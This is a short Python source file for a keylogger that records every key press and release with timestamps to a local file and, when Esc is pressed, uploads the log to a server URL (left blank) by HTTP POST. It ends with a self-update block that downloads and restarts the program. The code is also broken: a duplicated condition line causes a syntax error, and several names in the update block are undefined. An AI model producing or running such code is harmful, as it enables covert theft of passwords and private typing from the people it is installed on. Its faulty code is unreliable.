from pynput import keyboard
from pyupdater.client import Client
import datetime
import requests
import os

LOG_FILE = "keystrokes.txt"
UPLOAD_URL = ""

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log.write(f"{ts} PRESS   {key_str}\n")
    log.flush()  # make sure it hits disk immediately

def on_release(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log.write(f"{ts} RELEASE {key_str}\n")
    log.flush()
    if key == keyboard.Key.esc:
        if key == keyboard.Key.esc:
        upload_log()  # Upload before stopping
        return False  # Stop listener


def upload_log():
    """Sends the log file to the server."""
    if not os.path.exists(LOG_FILE):
        return
    try:
        with open(LOG_FILE, "rb") as f:
            # The key 'file' must match what the server expects
            files = {"file": (LOG_FILE, f, "text/plain")}
            response = requests.post(UPLOAD_URL, files=files, timeout=10)
            print(f"Upload status: {response.status_code}")
    except Exception as e:
        print(f"Upload failed: {e}")

with open(LOG_FILE, "a", encoding="utf-8") as log:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


client = Client(ClientConfig(), refresh=True)
if client.update_check(APP_NAME, APP_VERSION):
    client.download()
    client.extract_restart()